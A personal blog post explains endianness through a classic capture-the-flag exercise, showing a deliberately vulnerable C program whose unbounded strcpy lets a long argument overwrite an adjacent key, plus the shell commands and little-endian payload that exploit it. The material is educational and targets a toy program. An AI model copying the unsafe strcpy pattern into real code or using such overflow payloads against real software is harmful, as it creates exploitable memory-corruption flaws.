# the jazzybones word: endian

i broke my writing streak again. oh well.

normally, when we write numbers, we put the most significant digit first. for
example, the number one hundred and twenty three is written as "123". this is
called "big endian", since the biggest digit - the hundred - is written first.

most computer architectures store their numbers backwards, so instead of "123",
you would actually see "321"[^binary]. this has a few useful properties. for
example, when adding two numbers, we usually work right to left, like this:

[^binary]: obviously, most computers would _actually_ store numbers in binary,
but the general idea is the same.

     1  
      31
    + 94
    ----
     125

when you store your numbers backwards, you can do addition from left to right,
which is slightly easier to write in code. keep in mind, these decisions were
made 40 years ago when every byte that could be saved, was.

another useful property is that resizing numbers is really easy. for example,
let's say that i have a 2 digit year, like "24". this works for a while, but
eventually i need an actual, 4 digit year. if i want to extend "24" to "2024", i
have to add the "20" to the left of the "24", which is harder than extending
"42" to "4202".

many people, including myself, first learned about endianness after struggling
on some strange problem for hours, wondering why their numbers seem to be
backwards. for example, some may get stuck on this classic ctf problem:

```
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define target 0xd3adb33fl

int main(int argc, char *argv[]) {
	uint32_t key;
	char password[50];

	key = 0xfeedface;
	strcpy(password, argv[1]);

	printf("password input: %s\n", password);

	printf("key is %lx, we want %x... ", (unsigned long) key, target);

	if (key == target) {
		puts("you win :)");
	}
	else {
		puts("you lose :(");
	}
}
```

this program copies a user-provided string to a variable, and checks to see if
the key is correct. normally when you run this, you should always lose, like
this:

```
$ ./prog test
password input: test
key is feedface, we want d3adb33f... you lose :(
$ ./prog "i lost?!"
password input: i lost?!
key is feedface, we want d3adb33f... you lose :(
$ ./prog "how do i change the key!"
password input: how do i change the key!
key is feedface, we want d3adb33f... you lose :(
```

for some very long inputs, we the key starts changing.

```
$ ./prog aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
password input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
key is 61616161, we want d3adb33f... you lose :(
```

this happens because `strcpy` will naively copy bytes from the source to the
destination, even if the source is larger than the destination. when that
happens, `strcpy` starts overwriting data that it wasn't supposed to, including,
in this case, the key.

through some trial and error, we can find the exact location of the key,
relative to the password, like this:

```
$ ./prog aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1111
password input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1111
key is 31313131, we want d3adb33f... you lose :(
```

because the key has transformed into 0x31313131, we know that those last four
'1' characters in the password are actually controlling the key. we might try
and change the password naively, like this:

```
$ ./prog $(echo -en 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd3\xad\xb3\x3f')
password input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaӭ?
key is 3fb3add3, we want d3adb33f... you lose :(
```

this doesn't work because the key is stored in little endian, but we're writing
to it as if it's in big endian. to actually hack this program, we have to write
out the key backwards, like this:

```
$ ./prog $(echo -en 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x3f\xb3\xad\xd3')
password input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?
key is d3adb33f, we want d3adb33f... you win :)
```

endianness is just one of those things that you have to know about to do this
sort of stuff. there are thousands of similar bits of knowledge that are
necessary to do any job.

people often talk about things that "can't be taught in a class". these are
often abstract concepts, like "musicianship", or "artistic vision", which can
only be obtained through years of training and practice. endianness is
different. endianness can absolutely be taught in a class, i (hopefully) just
taught it in this article, but there are so many things other than endianness
that you just have to know. the way that shells parse arguments,
[ioctls](https://www.man7.org/linux/man-pages/man2/ioctl.2.html), the way that
some specific system handles some specific task. these aren't necessarily
complex topics, but there are just so many of them, and they're so deeply
ingrained in experts that it's almost impossible to teach them all.

there are just certain things that have to be learned in the field, which sucks
for teachers.
